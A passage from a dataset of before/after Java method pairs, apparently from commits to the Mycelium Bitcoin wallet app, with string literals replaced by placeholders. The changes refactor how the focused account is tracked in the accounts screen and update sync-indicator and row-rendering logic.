      if (_mbwManager.getWalletManager(false).getState() == WalletManager.State.SYNCHRONIZING || _mbwManager.getColuManager().getState() == WalletManager.State.SYNCHRONIZING) {
        _toaster.toast(R.string.synchronizing_please_wait,false);
        return true;
      }
      int id=menuItem.getItemId();
      if (id == R.id.miActivate) {
        activateSelected();
        return true;
      }
 else       if (id == R.id.miSetLabel) {
        setLabelOnAccount(_focusedAccount,""String_Node_Str"",true);
        return true;
      }
 else       if (id == R.id.miDeleteRecord) {
        deleteSelected();
        return true;
      }
 else       if (id == R.id.miArchive) {
        archiveSelected();
        return true;
      }
 else       if (id == R.id.miHideUnusedAccount) {
        hideSelected();
        return true;
      }
 else       if (id == R.id.miExport) {
        exportSelectedPrivateKey();
        return true;
      }
 else       if (id == R.id.miIgnoreWarnings) {
        ignoreSelectedPrivateKey();
        return true;
      }
 else       if (id == R.id.miSignMessage) {
        signMessage();
        return true;
      }
 else       if (id == R.id.miDetach) {
        detachFromLocalTrader();
        return true;
      }
 else       if (id == R.id.miShowOutputs) {
        showOutputs();
        return true;
      }
 else       if (id == R.id.miMakeBackup) {
        makeBackup();
        return true;
      }
 else       if (id == R.id.miSingleKeyBackupVerify) {
        verifySingleKeyBackup();
        return true;
      }
 else       if (id == R.id.miRescan) {
        rescan();
        return true;
      }
 else       if (id == R.id.miSetMail) {
        setCoinapultMail();
        return true;
      }
 else       if (id == R.id.miVerifyMail) {
        verifyCoinapultMail();
        return true;
      }
      return false;
    }
    @Override public void onDestroyActionMode(    ActionMode actionMode){
      currentActionMode=null;
      if (_focusedAccount != null) {
        _focusedAccount=null;
        update();
      }
    }
  }
;
  currentActionMode=parent.startSupportActionMode(actionMode);
  _focusedAccount=account;
  update();
}","private void updateIncludingMenus(){
  WalletAccount account=accountListAdapter.getFocusedAccount();
  final List<Integer> menus=Lists.newArrayList();
  if (!(account instanceof ColuAccount) && !Utils.checkIsLinked(account,_mbwManager.getColuManager().getAccounts().values())) {
    menus.add(R.menu.record_options_menu);
  }
  if ((account instanceof SingleAddressAccount) || (account.isDerivedFromInternalMasterseed())) {
    menus.add(R.menu.record_options_menu_backup);
  }
  if (account instanceof SingleAddressAccount) {
    menus.add(R.menu.record_options_menu_backup_verify);
  }
  if (account instanceof ColuAccount) {
    menus.add(R.menu.record_options_menu_backup);
    menus.add(R.menu.record_options_menu_backup_verify);
  }
  if (!account.isDerivedFromInternalMasterseed()) {
    menus.add(R.menu.record_options_menu_delete);
  }
  if (account.isActive() && account.canSpend() && !(account instanceof Bip44PubOnlyAccount)) {
    menus.add(R.menu.record_options_menu_sign);
  }
  if (account.isActive()) {
    menus.add(R.menu.record_options_menu_active);
  }
  if (account.isActive() && !(account instanceof CoinapultAccount)) {
    menus.add(R.menu.record_options_menu_outputs);
  }
  if (account instanceof CoinapultAccount) {
    menus.add(R.menu.record_options_menu_set_coinapult_mail);
  }
  if (account.isArchived()) {
    menus.add(R.menu.record_options_menu_archive);
  }
  if (account.isActive() && account instanceof ExportableAccount) {
    menus.add(R.menu.record_options_menu_export);
  }
  if (account.isActive() && account instanceof Bip44Account && !(account instanceof Bip44PubOnlyAccount)&& walletManager.getActiveMasterseedAccounts().size() > 1) {
    if (!((Bip44Account)account).hasHadActivity()) {
      menus.add(R.menu.record_options_menu_hide_unused);
    }
  }
  if (RecordRowBuilder.showLegacyAccountWarning(account,_mbwManager)) {
    menus.add(R.menu.record_options_menu_ignore_warning);
  }
  if (account.getId().equals(_mbwManager.getLocalTraderManager().getLocalTraderAccountId())) {
    menus.add(R.menu.record_options_menu_detach);
  }
  ActionBarActivity parent=(ActionBarActivity)getActivity();
  Callback actionMode=new Callback(){
    @Override public boolean onCreateActionMode(    ActionMode actionMode,    Menu menu){
      for (      Integer res : menus) {
        actionMode.getMenuInflater().inflate(res,menu);
      }
      return true;
    }
    @Override public boolean onPrepareActionMode(    ActionMode actionMode,    Menu menu){
      return true;
    }
    @Override public boolean onActionItemClicked(    ActionMode actionMode,    MenuItem menuItem){
      if (_mbwManager.getWalletManager(false).getState() == WalletManager.State.SYNCHRONIZING || _mbwManager.getColuManager().getState() == WalletManager.State.SYNCHRONIZING) {
        _toaster.toast(R.string.synchronizing_please_wait,false);
        return true;
      }
      int id=menuItem.getItemId();
      if (id == R.id.miActivate) {
        activateSelected();
        return true;
      }
 else       if (id == R.id.miSetLabel) {
        setLabelOnAccount(accountListAdapter.getFocusedAccount(),""String_Node_Str"",true);
        return true;
      }
 else       if (id == R.id.miDeleteRecord) {
        deleteSelected();
        return true;
      }
 else       if (id == R.id.miArchive) {
        archiveSelected();
        return true;
      }
 else       if (id == R.id.miHideUnusedAccount) {
        hideSelected();
        return true;
      }
 else       if (id == R.id.miExport) {
        exportSelectedPrivateKey();
        return true;
      }
 else       if (id == R.id.miIgnoreWarnings) {
        ignoreSelectedPrivateKey();
        return true;
      }
 else       if (id == R.id.miSignMessage) {
        signMessage();
        return true;
      }
 else       if (id == R.id.miDetach) {
        detachFromLocalTrader();
        return true;
      }
 else       if (id == R.id.miShowOutputs) {
        showOutputs();
        return true;
      }
 else       if (id == R.id.miMakeBackup) {
        makeBackup();
        return true;
      }
 else       if (id == R.id.miSingleKeyBackupVerify) {
        verifySingleKeyBackup();
        return true;
      }
 else       if (id == R.id.miRescan) {
        rescan();
        return true;
      }
 else       if (id == R.id.miSetMail) {
        setCoinapultMail();
        return true;
      }
 else       if (id == R.id.miVerifyMail) {
        verifyCoinapultMail();
        return true;
      }
      return false;
    }
    @Override public void onDestroyActionMode(    ActionMode actionMode){
      currentActionMode=null;
      if (accountListAdapter.getFocusedAccount() != null) {
        accountListAdapter.setFocusedAccount(null);
        update();
      }
    }
  }
;
  currentActionMode=parent.startSupportActionMode(actionMode);
  accountListAdapter.setFocusedAccount(account);
  update();
}"
91151,"private void signMessage(){
  if (!AccountsFragment.this.isAdded()) {
    return;
  }
  _mbwManager.runPinProtectedFunction(AccountsFragment.this.getActivity(),new Runnable(){
    @Override public void run(){
      if (!AccountsFragment.this.isAdded()) {
        return;
      }
      if (_focusedAccount instanceof CoinapultAccount) {
        CoinapultManager coinapultManager=_mbwManager.getCoinapultManager();
        MessageSigningActivity.callMe(getActivity(),coinapultManager.getAccountKey());
      }
 else       if (_focusedAccount instanceof SingleAddressAccount) {
        MessageSigningActivity.callMe(getActivity(),(SingleAddressAccount)_focusedAccount);
      }
 else       if (_focusedAccount instanceof ColuAccount) {
        MessageSigningActivity.callMe(getActivity(),((ColuAccount)_focusedAccount).getPrivateKey());
      }
 else {
        Intent intent=new Intent(getActivity(),HDSigningActivity.class);
        intent.putExtra(""String_Node_Str"",_focusedAccount.getId());
        startActivity(intent);
      }
    }
  }
);
}","private void signMessage(){
  if (!AccountsFragment.this.isAdded()) {
    return;
  }
  _mbwManager.runPinProtectedFunction(AccountsFragment.this.getActivity(),new Runnable(){
    @Override public void run(){
      if (!AccountsFragment.this.isAdded()) {
        return;
      }
      WalletAccount _focusedAccount=accountListAdapter.getFocusedAccount();
      if (_focusedAccount instanceof CoinapultAccount) {
        CoinapultManager coinapultManager=_mbwManager.getCoinapultManager();
        MessageSigningActivity.callMe(getActivity(),coinapultManager.getAccountKey());
      }
 else       if (_focusedAccount instanceof SingleAddressAccount) {
        MessageSigningActivity.callMe(getActivity(),(SingleAddressAccount)_focusedAccount);
      }
 else       if (_focusedAccount instanceof ColuAccount) {
        MessageSigningActivity.callMe(getActivity(),((ColuAccount)_focusedAccount).getPrivateKey());
      }
 else {
        Intent intent=new Intent(getActivity(),HDSigningActivity.class);
        intent.putExtra(""String_Node_Str"",_focusedAccount.getId());
        startActivity(intent);
      }
    }
  }
);
}"
91152,"private void update(){
  if (!isAdded()) {
    return;
  }
  LinearLayout llRecords=(LinearLayout)getView().findViewById(R.id.llRecords);
  llRecords.removeAllViews();
  if (_mbwManager.isKeyManagementLocked()) {
    getView().findViewById(R.id.svRecords).setVisibility(View.GONE);
    getView().findViewById(R.id.llLocked).setVisibility(View.VISIBLE);
  }
 else {
    getView().findViewById(R.id.svRecords).setVisibility(View.VISIBLE);
    getView().findViewById(R.id.llLocked).setVisibility(View.GONE);
    List<WalletAccount> activeHdAccounts=walletManager.getActiveMasterseedAccounts();
    List<WalletAccount> activeOtherAccounts=walletManager.getActiveOtherAccounts();
    List<WalletAccount> activeHdRecords=Utils.sortAccounts(activeHdAccounts,_storage);
    List<WalletAccount> activeOtherRecords=Utils.sortAccounts(activeOtherAccounts,_storage);
    List<WalletAccount> archivedRecords=Utils.sortAccounts(walletManager.getArchivedAccounts(),_storage);
    WalletAccount selectedAccount=_mbwManager.getSelectedAccount();
    CurrencySum totalSpendableBalance=new CurrencySum();
    String activeTitle=getString(R.string.active_hd_accounts_name) + (activeHdRecords.isEmpty() ? ""String_Node_Str"" + getString(R.string.active_accounts_empty) : ""String_Node_Str"");
    CurrencySum spendableBalanceHdAccounts=getSpendableBalance(activeHdAccounts);
    LinearLayout activeHdAccountsView=createAccountViewList(activeTitle,activeHdRecords,selectedAccount,spendableBalanceHdAccounts);
    llRecords.addView(activeHdAccountsView);
    totalSpendableBalance.add(spendableBalanceHdAccounts);
    if (!activeOtherRecords.isEmpty()) {
      CurrencySum spendableBalanceOtherAccounts=getSpendableBalance(activeOtherAccounts);
      LinearLayout activeOtherAccountsView=createAccountViewList(getString(R.string.active_other_accounts_name),activeOtherRecords,selectedAccount,spendableBalanceOtherAccounts);
      llRecords.addView(activeOtherAccountsView);
      totalSpendableBalance.add(spendableBalanceOtherAccounts);
      LinearLayout activeOtherSum=createActiveAccountBalanceSumView(totalSpendableBalance);
      llRecords.addView(activeOtherSum);
    }
    if (archivedRecords.size() > 0) {
      LinearLayout archived=createAccountViewList(getString(R.string.archive_name),archivedRecords,selectedAccount,null);
      llRecords.addView(archived);
    }
  }
}","private void update(){
  if (!isAdded()) {
    return;
  }
  if (_mbwManager.isKeyManagementLocked()) {
    rvRecords.setVisibility(View.GONE);
    llLocked.setVisibility(View.VISIBLE);
  }
 else {
    rvRecords.setVisibility(View.VISIBLE);
    llLocked.setVisibility(View.GONE);
    accountListAdapter.updateData();
  }
}"
91153,"private void deleteSelected(){
  if (!AccountsFragment.this.isAdded()) {
    return;
  }
  if (_focusedAccount.isActive() && _mbwManager.getWalletManager(false).getActiveAccounts().size() < 2) {
    _toaster.toast(R.string.keep_one_active,false);
    return;
  }
  _mbwManager.runPinProtectedFunction(AccountsFragment.this.getActivity(),new Runnable(){
    @Override public void run(){
      if (!AccountsFragment.this.isAdded()) {
        return;
      }
      deleteAccount(_focusedAccount);
    }
  }
);
}","private void deleteSelected(){
  if (!AccountsFragment.this.isAdded()) {
    return;
  }
  final WalletAccount _focusedAccount=accountListAdapter.getFocusedAccount();
  if (_focusedAccount.isActive() && _mbwManager.getWalletManager(false).getActiveAccounts().size() < 2) {
    _toaster.toast(R.string.keep_one_active,false);
    return;
  }
  _mbwManager.runPinProtectedFunction(AccountsFragment.this.getActivity(),new Runnable(){
    @Override public void run(){
      if (!AccountsFragment.this.isAdded()) {
        return;
      }
      deleteAccount(_focusedAccount);
    }
  }
);
}"
91154,"@Override public boolean onActionItemClicked(ActionMode actionMode,MenuItem menuItem){
  if (_mbwManager.getWalletManager(false).getState() == WalletManager.State.SYNCHRONIZING || _mbwManager.getColuManager().getState() == WalletManager.State.SYNCHRONIZING) {
    _toaster.toast(R.string.synchronizing_please_wait,false);
    return true;
  }
  int id=menuItem.getItemId();
  if (id == R.id.miActivate) {
    activateSelected();
    return true;
  }
 else   if (id == R.id.miSetLabel) {
    setLabelOnAccount(_focusedAccount,""String_Node_Str"",true);
    return true;
  }
 else   if (id == R.id.miDeleteRecord) {
    deleteSelected();
    return true;
  }
 else   if (id == R.id.miArchive) {
    archiveSelected();
    return true;
  }
 else   if (id == R.id.miHideUnusedAccount) {
    hideSelected();
    return true;
  }
 else   if (id == R.id.miExport) {
    exportSelectedPrivateKey();
    return true;
  }
 else   if (id == R.id.miIgnoreWarnings) {
    ignoreSelectedPrivateKey();
    return true;
  }
 else   if (id == R.id.miSignMessage) {
    signMessage();
    return true;
  }
 else   if (id == R.id.miDetach) {
    detachFromLocalTrader();
    return true;
  }
 else   if (id == R.id.miShowOutputs) {
    showOutputs();
    return true;
  }
 else   if (id == R.id.miMakeBackup) {
    makeBackup();
    return true;
  }
 else   if (id == R.id.miSingleKeyBackupVerify) {
    verifySingleKeyBackup();
    return true;
  }
 else   if (id == R.id.miRescan) {
    rescan();
    return true;
  }
 else   if (id == R.id.miSetMail) {
    setCoinapultMail();
    return true;
  }
 else   if (id == R.id.miVerifyMail) {
    verifyCoinapultMail();
    return true;
  }
  return false;
}","@Override public boolean onActionItemClicked(ActionMode actionMode,MenuItem menuItem){
  if (_mbwManager.getWalletManager(false).getState() == WalletManager.State.SYNCHRONIZING || _mbwManager.getColuManager().getState() == WalletManager.State.SYNCHRONIZING) {
    _toaster.toast(R.string.synchronizing_please_wait,false);
    return true;
  }
  int id=menuItem.getItemId();
  if (id == R.id.miActivate) {
    activateSelected();
    return true;
  }
 else   if (id == R.id.miSetLabel) {
    setLabelOnAccount(accountListAdapter.getFocusedAccount(),""String_Node_Str"",true);
    return true;
  }
 else   if (id == R.id.miDeleteRecord) {
    deleteSelected();
    return true;
  }
 else   if (id == R.id.miArchive) {
    archiveSelected();
    return true;
  }
 else   if (id == R.id.miHideUnusedAccount) {
    hideSelected();
    return true;
  }
 else   if (id == R.id.miExport) {
    exportSelectedPrivateKey();
    return true;
  }
 else   if (id == R.id.miIgnoreWarnings) {
    ignoreSelectedPrivateKey();
    return true;
  }
 else   if (id == R.id.miSignMessage) {
    signMessage();
    return true;
  }
 else   if (id == R.id.miDetach) {
    detachFromLocalTrader();
    return true;
  }
 else   if (id == R.id.miShowOutputs) {
    showOutputs();
    return true;
  }
 else   if (id == R.id.miMakeBackup) {
    makeBackup();
    return true;
  }
 else   if (id == R.id.miSingleKeyBackupVerify) {
    verifySingleKeyBackup();
    return true;
  }
 else   if (id == R.id.miRescan) {
    rescan();
    return true;
  }
 else   if (id == R.id.miSetMail) {
    setCoinapultMail();
    return true;
  }
 else   if (id == R.id.miVerifyMail) {
    verifyCoinapultMail();
    return true;
  }
  return false;
}"
91155,"private void showOutputs(){
  Intent intent=new Intent(getActivity(),UnspentOutputsActivity.class);
  intent.putExtra(""String_Node_Str"",_focusedAccount.getId());
  startActivity(intent);
}","private void showOutputs(){
  Intent intent=new Intent(getActivity(),UnspentOutputsActivity.class);
  WalletAccount _focusedAccount=accountListAdapter.getFocusedAccount();
  intent.putExtra(""String_Node_Str"",_focusedAccount.getId());
  startActivity(intent);
}"
91156,"private void ignoreSelectedPrivateKey(){
  if (!AccountsFragment.this.isAdded()) {
    return;
  }
  _mbwManager.runPinProtectedFunction(AccountsFragment.this.getActivity(),new Runnable(){
    @Override public void run(){
      if (!AccountsFragment.this.isAdded()) {
        return;
      }
      AlertDialog.Builder confirmDialog=new AlertDialog.Builder(getActivity());
      confirmDialog.setTitle(R.string.ignore_warnings_title);
      confirmDialog.setMessage(getString(R.string.ignore_warnings_description));
      confirmDialog.setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
        public void onClick(        DialogInterface arg0,        int arg1){
          _mbwManager.getMetadataStorage().setIgnoreLegacyWarning(_focusedAccount.getId(),true);
          _mbwManager.getEventBus().post(new AccountChanged(_focusedAccount.getId()));
        }
      }
);
      confirmDialog.setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
        public void onClick(        DialogInterface arg0,        int arg1){
          _mbwManager.getMetadataStorage().setIgnoreLegacyWarning(_focusedAccount.getId(),false);
          _mbwManager.getEventBus().post(new AccountChanged(_focusedAccount.getId()));
        }
      }
);
      confirmDialog.show();
    }
  }
);
}","private void ignoreSelectedPrivateKey(){
  if (!AccountsFragment.this.isAdded()) {
    return;
  }
  _mbwManager.runPinProtectedFunction(AccountsFragment.this.getActivity(),new Runnable(){
    @Override public void run(){
      if (!AccountsFragment.this.isAdded()) {
        return;
      }
      AlertDialog.Builder confirmDialog=new AlertDialog.Builder(getActivity());
      confirmDialog.setTitle(R.string.ignore_warnings_title);
      confirmDialog.setMessage(getString(R.string.ignore_warnings_description));
      final WalletAccount _focusedAccount=accountListAdapter.getFocusedAccount();
      confirmDialog.setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
        public void onClick(        DialogInterface arg0,        int arg1){
          _mbwManager.getMetadataStorage().setIgnoreLegacyWarning(_focusedAccount.getId(),true);
          _mbwManager.getEventBus().post(new AccountChanged(_focusedAccount.getId()));
        }
      }
);
      confirmDialog.setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
        public void onClick(        DialogInterface arg0,        int arg1){
          _mbwManager.getMetadataStorage().setIgnoreLegacyWarning(_focusedAccount.getId(),false);
          _mbwManager.getEventBus().post(new AccountChanged(_focusedAccount.getId()));
        }
      }
);
      confirmDialog.show();
    }
  }
);
}"
91157,"@Subscribe public void syncStarted(SyncStarted event){
  update();
}","@Subscribe public void syncStarted(SyncStarted event){
}"
91158,"private void hideSelected(){
  if (!AccountsFragment.this.isAdded()) {
    return;
  }
  if (_mbwManager.getWalletManager(false).getActiveAccounts().size() < 2) {
    _toaster.toast(R.string.keep_one_active,false);
    return;
  }
  if (_focusedAccount instanceof Bip44Account) {
    final Bip44Account account=(Bip44Account)_focusedAccount;
    if (account.hasHadActivity()) {
      _toaster.toast(R.string.dont_allow_hiding_used_notification,false);
      return;
    }
    _mbwManager.runPinProtectedFunction(this.getActivity(),new Runnable(){
      @Override public void run(){
        _mbwManager.getWalletManager(false).removeUnusedBip44Account();
        _storage.deleteAccountMetadata(account.getId());
        _mbwManager.setSelectedAccount(_mbwManager.getWalletManager(false).getActiveAccounts().get(0).getId());
        _focusedAccount=null;
        finishCurrentActionMode();
      }
    }
);
  }
}","private void hideSelected(){
  if (!AccountsFragment.this.isAdded()) {
    return;
  }
  if (_mbwManager.getWalletManager(false).getActiveAccounts().size() < 2) {
    _toaster.toast(R.string.keep_one_active,false);
    return;
  }
  final WalletAccount _focusedAccount=accountListAdapter.getFocusedAccount();
  if (_focusedAccount instanceof Bip44Account) {
    final Bip44Account account=(Bip44Account)_focusedAccount;
    if (account.hasHadActivity()) {
      _toaster.toast(R.string.dont_allow_hiding_used_notification,false);
      return;
    }
    _mbwManager.runPinProtectedFunction(this.getActivity(),new Runnable(){
      @Override public void run(){
        _mbwManager.getWalletManager(false).removeUnusedBip44Account();
        _storage.deleteAccountMetadata(account.getId());
        _mbwManager.setSelectedAccount(_mbwManager.getWalletManager(false).getActiveAccounts().get(0).getId());
        accountListAdapter.setFocusedAccount(null);
        finishCurrentActionMode();
      }
    }
);
  }
}"
91159,"private void rescan(){
  if (!AccountsFragment.this.isAdded()) {
    return;
  }
  _focusedAccount.dropCachedData();
  _mbwManager.getWalletManager(false).startSynchronization(SyncMode.FULL_SYNC_CURRENT_ACCOUNT_FORCED);
  _mbwManager.getColuManager().startSynchronization();
}","private void rescan(){
  if (!AccountsFragment.this.isAdded()) {
    return;
  }
  accountListAdapter.getFocusedAccount().dropCachedData();
  _mbwManager.getWalletManager(false).startSynchronization(SyncMode.FULL_SYNC_CURRENT_ACCOUNT_FORCED);
  _mbwManager.getColuManager().startSynchronization();
}"
91160,"@Override public boolean onOptionsItemSelected(MenuItem item){
  final int itemId=item.getItemId();
switch (itemId) {
case R.id.miColdStorage:
    InstantWalletActivity.callMe(this);
  return true;
case R.id.miSettings:
{
  Intent intent=new Intent(this,SettingsActivity.class);
  startActivityForResult(intent,REQUEST_SETTING_CHANGED);
  return true;
}
case R.id.miBackup:
Utils.pinProtectedWordlistBackup(this);
return true;
case R.id.miRefresh:
SyncMode syncMode=SyncMode.NORMAL_FORCED;
if (new Random().nextInt(5) == 0) {
syncMode=SyncMode.FULL_SYNC_CURRENT_ACCOUNT_FORCED;
}
 else if (mViewPager.getCurrentItem() == TAB_ID_ACCOUNTS) {
syncMode=SyncMode.NORMAL_ALL_ACCOUNTS_FORCED;
}
_mbwManager.getWalletManager(false).startSynchronization(syncMode);
_mbwManager.getColuManager().startSynchronization();
_mbwManager.getExchangeRateManager().requestOptionalRefresh();
break;
case R.id.miHelp:
openMyceliumHelp();
break;
case R.id.miAbout:
{
Intent intent=new Intent(this,AboutActivity.class);
startActivity(intent);
break;
}
case R.id.miRescanTransactions:
_mbwManager.getSelectedAccount().dropCachedData();
_mbwManager.getWalletManager(false).startSynchronization(SyncMode.FULL_SYNC_CURRENT_ACCOUNT_FORCED);
_mbwManager.getColuManager().startSynchronization();
break;
case R.id.miExportHistory:
shareTransactionHistory();
break;
case R.id.miVerifyMessage:
startActivity(new Intent(this,MessageVerifyActivity.class));
break;
}
return super.onOptionsItemSelected(item);
}","@Override public boolean onOptionsItemSelected(MenuItem item){
  final int itemId=item.getItemId();
switch (itemId) {
case R.id.miColdStorage:
    InstantWalletActivity.callMe(this);
  return true;
case R.id.miSettings:
{
  Intent intent=new Intent(this,SettingsActivity.class);
  startActivityForResult(intent,REQUEST_SETTING_CHANGED);
  return true;
}
case R.id.miBackup:
Utils.pinProtectedWordlistBackup(this);
return true;
case R.id.miRefresh:
SyncMode syncMode=SyncMode.NORMAL_FORCED;
if (new Random().nextInt(5) == 0) {
syncMode=SyncMode.FULL_SYNC_CURRENT_ACCOUNT_FORCED;
}
 else if (mViewPager.getCurrentItem() == TAB_ID_ACCOUNTS) {
syncMode=SyncMode.NORMAL_ALL_ACCOUNTS_FORCED;
}
_mbwManager.getWalletManager(false).startSynchronization(syncMode);
_mbwManager.getColuManager().startSynchronization();
_mbwManager.getExchangeRateManager().requestOptionalRefresh();
return true;
case R.id.miHelp:
openMyceliumHelp();
break;
case R.id.miAbout:
{
Intent intent=new Intent(this,AboutActivity.class);
startActivity(intent);
break;
}
case R.id.miRescanTransactions:
_mbwManager.getSelectedAccount().dropCachedData();
_mbwManager.getWalletManager(false).startSynchronization(SyncMode.FULL_SYNC_CURRENT_ACCOUNT_FORCED);
_mbwManager.getColuManager().startSynchronization();
break;
case R.id.miExportHistory:
shareTransactionHistory();
break;
case R.id.miVerifyMessage:
startActivity(new Intent(this,MessageVerifyActivity.class));
break;
}
return super.onOptionsItemSelected(item);
}"
91161,"public void setRefreshAnimation(){
  if (refreshItem != null) {
    if (_mbwManager.getWalletManager(false).getState() == WalletManager.State.SYNCHRONIZING || _mbwManager.getColuManager().getState() == WalletManager.State.SYNCHRONIZING) {
      MenuItem menuItem=MenuItemCompat.setActionView(refreshItem,R.layout.actionbar_indeterminate_progress);
      ImageView ivTorIcon=(ImageView)menuItem.getActionView().findViewById(R.id.ivTorIcon);
      if (_mbwManager.getTorMode() == ServerEndpointType.Types.ONLY_TOR && _mbwManager.getTorManager() != null) {
        ivTorIcon.setVisibility(View.VISIBLE);
        if (_mbwManager.getTorManager().getInitState() == 100) {
          ivTorIcon.setImageResource(R.drawable.tor);
        }
 else {
          ivTorIcon.setImageResource(R.drawable.tor_gray);
        }
      }
 else {
        ivTorIcon.setVisibility(View.GONE);
      }
    }
 else {
      MenuItemCompat.setActionView(refreshItem,null);
    }
  }
}","public void setRefreshAnimation(){
  if (refreshItem != null) {
    if (_mbwManager.getWalletManager(false).getState() == WalletManager.State.SYNCHRONIZING || _mbwManager.getColuManager().getState() == WalletManager.State.SYNCHRONIZING) {
      if (commonSyncState != WalletManager.State.SYNCHRONIZING) {
        commonSyncState=WalletManager.State.SYNCHRONIZING;
        MenuItem menuItem=MenuItemCompat.setActionView(refreshItem,R.layout.actionbar_indeterminate_progress);
        ImageView ivTorIcon=(ImageView)menuItem.getActionView().findViewById(R.id.ivTorIcon);
        if (_mbwManager.getTorMode() == ServerEndpointType.Types.ONLY_TOR && _mbwManager.getTorManager() != null) {
          ivTorIcon.setVisibility(View.VISIBLE);
          if (_mbwManager.getTorManager().getInitState() == 100) {
            ivTorIcon.setImageResource(R.drawable.tor);
          }
 else {
            ivTorIcon.setImageResource(R.drawable.tor_gray);
          }
        }
 else {
          ivTorIcon.setVisibility(View.GONE);
        }
      }
    }
 else {
      commonSyncState=WalletManager.State.READY;
      MenuItemCompat.setActionView(refreshItem,null);
    }
  }
}"
91162,"public View buildRecordView(ViewGroup parent,WalletAccount walletAccount,boolean isSelected,boolean hasFocus,View convertView){
  View rowView=convertView;
  if (rowView == null) {
    rowView=inflater.inflate(R.layout.record_row,parent,false);
  }
  if (!isSelected) {
    Utils.setAlpha(rowView,0.5f);
  }
  int textColor=resources.getColor(R.color.white);
  if (hasFocus) {
    rowView.setBackgroundColor(resources.getColor(R.color.selectedrecord));
  }
  ImageView icon=(ImageView)rowView.findViewById(R.id.ivIcon);
  Drawable drawableForAccount=Utils.getDrawableForAccount(walletAccount,isSelected,resources);
  if (drawableForAccount == null) {
    icon.setVisibility(View.INVISIBLE);
  }
 else {
    icon.setVisibility(View.VISIBLE);
    icon.setImageDrawable(drawableForAccount);
  }
  TextView tvLabel=((TextView)rowView.findViewById(R.id.tvLabel));
  TextView tvWhatIsIt=((TextView)rowView.findViewById(R.id.tvWhatIsIt));
  String name=mbwManager.getMetadataStorage().getLabelByAccount(walletAccount.getId());
  WalletAccount linked=Utils.getLinkedAccount(walletAccount,mbwManager.getColuManager().getAccounts().values());
  if (linked != null && linked instanceof ColuAccount) {
    if (((ColuAccount)linked).getColuAsset().assetType == ColuAccount.ColuAssetType.RMC) {
      tvWhatIsIt.setOnClickListener(new View.OnClickListener(){
        @Override public void onClick(        View view){
          new AlertDialog.Builder(view.getContext()).setMessage(resources.getString(R.string.rmc_bitcoin_acc_what_is_it)).setPositiveButton(R.string.button_ok,null).create().show();
        }
      }
);
      tvWhatIsIt.setVisibility(View.VISIBLE);
    }
 else {
      tvWhatIsIt.setVisibility(View.GONE);
    }
  }
 else {
    tvWhatIsIt.setVisibility(View.GONE);
  }
  if (name.length() == 0) {
    rowView.findViewById(R.id.tvLabel).setVisibility(View.GONE);
  }
 else {
    tvLabel.setVisibility(View.VISIBLE);
    tvLabel.setText(Html.fromHtml(name));
    tvLabel.setTextColor(textColor);
  }
  String displayAddress;
  if (walletAccount.isActive()) {
    if (walletAccount instanceof Bip44PubOnlyAccount) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        displayAddress=resources.getString(R.string.contains_addresses,Integer.toString(numKeys));
      }
 else {
        displayAddress=resources.getString(R.string.account_contains_one_address_info);
      }
    }
 else     if (walletAccount instanceof Bip44Account) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        displayAddress=resources.getString(R.string.contains_keys,Integer.toString(numKeys));
      }
 else {
        displayAddress=resources.getString(R.string.account_contains_one_key_info);
      }
    }
 else {
      Optional<Address> receivingAddress=walletAccount.getReceivingAddress();
      if (receivingAddress.isPresent()) {
        if (name.length() == 0) {
          displayAddress=receivingAddress.get().toMultiLineString();
        }
 else {
          displayAddress=receivingAddress.get().getShortAddress();
        }
      }
 else {
        displayAddress=""String_Node_Str"";
      }
    }
  }
 else {
    displayAddress=""String_Node_Str"";
  }
  TextView tvAddress=((TextView)rowView.findViewById(R.id.tvAddress));
  tvAddress.setText(displayAddress);
  tvAddress.setTextColor(textColor);
  rowView.setTag(walletAccount);
  if (walletAccount.isActive()) {
    CurrencyBasedBalance balance=walletAccount.getCurrencyBasedBalance();
    rowView.findViewById(R.id.tvBalance).setVisibility(View.VISIBLE);
    String balanceString=Utils.getFormattedValueWithUnit(balance.confirmed,mbwManager.getBitcoinDenomination());
    if (walletAccount instanceof ColuAccount) {
      balanceString=Utils.getColuFormattedValueWithUnit(walletAccount.getCurrencyBasedBalance().confirmed);
    }
    TextView tvBalance=((TextView)rowView.findViewById(R.id.tvBalance));
    tvBalance.setText(balanceString);
    tvBalance.setTextColor(textColor);
    boolean showBackupMissingWarning=showBackupMissingWarning(walletAccount,mbwManager);
    rowView.findViewById(R.id.tvBackupMissingWarning).setVisibility(showBackupMissingWarning ? View.VISIBLE : View.GONE);
  }
 else {
    rowView.findViewById(R.id.tvBalance).setVisibility(View.GONE);
    rowView.findViewById(R.id.tvBackupMissingWarning).setVisibility(View.GONE);
  }
  if (walletAccount.getId().equals(mbwManager.getLocalTraderManager().getLocalTraderAccountId())) {
    rowView.findViewById(R.id.tvTraderKey).setVisibility(View.VISIBLE);
  }
 else {
    rowView.findViewById(R.id.tvTraderKey).setVisibility(View.GONE);
  }
  return rowView;
}","public View buildRecordView(ViewGroup parent,WalletAccount walletAccount,boolean isSelected,boolean hasFocus,View convertView){
  View rowView=convertView;
  if (rowView == null) {
    rowView=inflater.inflate(R.layout.record_row,parent,false);
  }
  if (!isSelected) {
    Utils.setAlpha(rowView,0.5f);
  }
 else {
    Utils.setAlpha(rowView,1f);
  }
  int textColor=resources.getColor(R.color.white);
  if (hasFocus) {
    rowView.setBackgroundColor(resources.getColor(R.color.selectedrecord));
  }
 else {
    rowView.setBackgroundColor(resources.getColor(R.color.transparent));
  }
  ImageView icon=(ImageView)rowView.findViewById(R.id.ivIcon);
  Drawable drawableForAccount=Utils.getDrawableForAccount(walletAccount,isSelected,resources);
  if (drawableForAccount == null) {
    icon.setVisibility(View.INVISIBLE);
  }
 else {
    icon.setVisibility(View.VISIBLE);
    icon.setImageDrawable(drawableForAccount);
  }
  TextView tvLabel=((TextView)rowView.findViewById(R.id.tvLabel));
  TextView tvWhatIsIt=((TextView)rowView.findViewById(R.id.tvWhatIsIt));
  String name=mbwManager.getMetadataStorage().getLabelByAccount(walletAccount.getId());
  WalletAccount linked=Utils.getLinkedAccount(walletAccount,mbwManager.getColuManager().getAccounts().values());
  if (linked != null && linked instanceof ColuAccount) {
